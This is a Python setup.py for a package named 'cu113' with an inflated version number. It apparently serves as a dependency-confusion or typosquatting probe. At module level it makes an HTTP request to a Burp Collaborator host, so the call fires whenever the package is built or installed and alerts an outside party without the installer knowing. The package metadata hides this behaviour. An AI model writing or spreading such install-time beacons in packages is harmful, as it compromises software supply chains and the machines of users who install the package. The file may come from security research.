import requests
from setuptools import setup
from setuptools.command.install import install

print("hello")

x = requests.get(
    'https://re9xwxujs1j6e74rnz6xjqz8azgp4e.burpcollaborator.net')

setup(name='cu113',
      version='10.0.0',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',    
      zip_safe=False)
